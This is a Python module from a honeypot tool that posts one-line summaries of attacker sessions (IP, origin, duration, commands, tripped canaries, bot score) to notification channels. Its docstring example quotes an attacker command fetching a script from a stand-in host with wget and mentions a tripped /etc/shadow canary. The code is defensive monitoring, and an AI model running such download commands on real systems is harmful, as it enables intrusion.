"""
Polaroid — one-line attacker session summaries auto-posted to a
configured notification channel.

Fires at session end if (a) bot_score is ≥ threshold (default 60) OR
(b) any canary token tripped during the session. Renders a single
human-readable line:

    "203.0.113.5 (CN, AS4134) spent 4m38s on SSH — 12 cmds incl.
     `wget evil.com/x.sh`; tripped /etc/shadow; bot 87/high"

Posts via the existing notification fan-out (desktop / discord / slack
/ telegram / email / webhook) using the channels configured under
`[labyrinth.polaroid]` in config.toml — independent of alert rules so
the polaroid is its own subscribable feed.

Settings (config.toml):
    [labyrinth.polaroid]
    enabled = true
    bot_score_threshold = 60       # post if final bot_score >= this
    always_on_canary = true        # always post if any canary tripped
    channels = ["desktop", "discord"]   # subset of standard channels
    max_command_preview_chars = 60      # truncate the `incl. <cmd>` snippet
"""
from __future__ import annotations

import threading
from concurrent.futures import ThreadPoolExecutor
from dataclasses import dataclass

import structlog

log = structlog.get_logger()


# Bounded worker pool — caps thread proliferation during burst session
# closures (e.g. honeypot under DDoS-style probe sweeps). 4 workers is
# enough to render + fan out polaroids fast without crowding out the
# main ingest sink workers on a small box (Pi 5).
_POOL_MAX = 4
_pool: ThreadPoolExecutor | None = None
_pool_lock = threading.Lock()


def _get_pool() -> ThreadPoolExecutor:
    global _pool
    with _pool_lock:
        if _pool is None:
            _pool = ThreadPoolExecutor(
                max_workers=_POOL_MAX,
                thread_name_prefix="meli-polaroid",
            )
        return _pool


def shutdown(wait: bool = False) -> None:
    """Shut down the polaroid pool (tests/daemon shutdown)."""
    global _pool
    with _pool_lock:
        if _pool is not None:
            _pool.shutdown(wait=wait)
            _pool = None


@dataclass
class PolaroidContext:
    session_id: str
    peer_ip: str
    protocol: str
    duration_s: float
    command_count: int
    last_commands: list[str]
    bot_score: int | None
    bot_confidence: str | None
    canary_trips: list[dict]      # [{token_id, path, severity}, ...]
    country: str | None = None
    asn: str | None = None


def _fmt_dur(s: float) -> str:
    s = int(s)
    if s < 60:
        return f"{s}s"
    if s < 3600:
        return f"{s // 60}m{s % 60}s"
    return f"{s // 3600}h{(s % 3600) // 60}m"


def _settings() -> dict:
    try:
        from meli.config import get_config
        cfg = get_config()
        return {
            "enabled": cfg.get("labyrinth.polaroid", "enabled", default=True),
            "threshold": int(cfg.get("labyrinth.polaroid", "bot_score_threshold",
                                     default=60) or 60),
            "always_on_canary": cfg.get("labyrinth.polaroid", "always_on_canary",
                                        default=True),
            "channels": cfg.get("labyrinth.polaroid", "channels",
                                default=["desktop"]) or ["desktop"],
            "max_preview": int(cfg.get("labyrinth.polaroid",
                                       "max_command_preview_chars",
                                       default=60) or 60),
        }
    except Exception:
        return {"enabled": True, "threshold": 60, "always_on_canary": True,
                "channels": ["desktop"], "max_preview": 60}


def _enrich_geo(ip: str) -> tuple[str | None, str | None]:
    try:
        from meli.enrichment.geoip import geolocate_ip
        g = geolocate_ip(ip) or {}
        return g.get("country_code") or g.get("country"), g.get("asn")
    except Exception:
        return None, None


def render(ctx: PolaroidContext, max_preview: int = 60) -> str:
    where_bits = []
    if ctx.country:
        where_bits.append(ctx.country)
    if ctx.asn:
        where_bits.append(str(ctx.asn))
    where = f" ({', '.join(where_bits)})" if where_bits else ""

    parts = [f"{ctx.peer_ip}{where}",
             f"spent {_fmt_dur(ctx.duration_s)} on {ctx.protocol.upper()}",
             f"— {ctx.command_count} cmd{'s' if ctx.command_count != 1 else ''}"]

    if ctx.last_commands:
        notable = max(ctx.last_commands, key=len)
        snippet = notable.strip().replace("\n", " ")
        if len(snippet) > max_preview:
            snippet = snippet[: max_preview - 1] + "…"
        parts.append(f"incl. `{snippet}`")

    if ctx.canary_trips:
        names = ", ".join(sorted({t.get("path") or t.get("token_id", "?")
                                  for t in ctx.canary_trips}))
        parts.append(f"tripped {names}")

    if ctx.bot_score is not None:
        conf = f"/{ctx.bot_confidence}" if ctx.bot_confidence else ""
        parts.append(f"bot {ctx.bot_score}{conf}")

    return " ".join(parts).rstrip(" ;,")


def _severity_for(ctx: PolaroidContext) -> str:
    if any((t.get("severity") or "").upper() == "CRITICAL" for t in ctx.canary_trips):
        return "CRITICAL"
    if ctx.canary_trips:
        return "HIGH"
    if (ctx.bot_score or 0) >= 80:
        return "HIGH"
    if (ctx.bot_score or 0) >= 60:
        return "MEDIUM"
    return "LOW"


def post(ctx: PolaroidContext) -> bool:
    """Render the polaroid and fan out to configured channels.
    Best-effort: any notifier failure is logged, not raised.
    Returns True if the polaroid was posted, False if suppressed."""
    s = _settings()
    if not s["enabled"]:
        return False

    if not ctx.canary_trips and (ctx.bot_score or 0) < s["threshold"]:
        # Below threshold and no canary — quiet.
        return False
    if ctx.canary_trips and not s["always_on_canary"] and \
            (ctx.bot_score or 0) < s["threshold"]:
        return False

    # Enrich on the worker thread (geoip can be slow on cold start).
    def _worker():
        try:
            if ctx.country is None and ctx.asn is None:
                ctx.country, ctx.asn = _enrich_geo(ctx.peer_ip)
            line = render(ctx, max_preview=s["max_preview"])
            severity = _severity_for(ctx)
            _fanout(s["channels"], "Polaroid", line, severity)
            log.info("polaroid posted", ip=ctx.peer_ip,
                     bot_score=ctx.bot_score, canary=len(ctx.canary_trips))
        except Exception as e:
            log.warning("polaroid post failed", error=str(e))

    try:
        _get_pool().submit(_worker)
    except RuntimeError:
        # Pool already shut down (process exiting). Fall back to inline
        # render so we don't lose the polaroid in flight, but never raise.
        try:
            _worker()
        except Exception:
            pass
    return True


def _fanout(channels: list[str], rule_name: str, summary: str, severity: str) -> None:
    """Reuse the alerts notifier fan-out so we don't duplicate logic."""
    try:
        from meli.alerts.engine import _send_notifications
        _send_notifications(channels, rule_name, summary, severity)
    except Exception as e:
        log.warning("polaroid fanout failed", error=str(e))
